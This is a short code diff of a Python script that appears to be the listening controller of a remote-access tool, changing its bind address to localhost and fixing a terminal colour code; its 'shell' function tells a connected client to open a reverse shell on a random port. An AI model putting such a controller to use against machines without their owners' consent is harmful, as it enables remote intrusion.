@@ -6,7 +6,7 @@ import random
 import threading
 import os
 
-HOST = "0.0.0.0" # Address to listen on
+HOST = "127.0.0.1" # Address to listen on
 PORT = 6969 # Port to listen on. (Better to use unprivileged ports)
 
 connections = list() # List of active connections 
@@ -30,7 +30,7 @@ def wait_response(conn):
 
 def shell(conn): 
     """Actions performed when the shell command is typed"""
-    print("\033[96m[INFO] Dropping into a shell...\033[91m")
+    print("\033[96m[INFO] Dropping into a shell...\033[0m")
     time.sleep(0.5)
     port = random.randint(49152, 65525) # Generate a random port for the reverse shell
     send_command(conn, "shell", port)
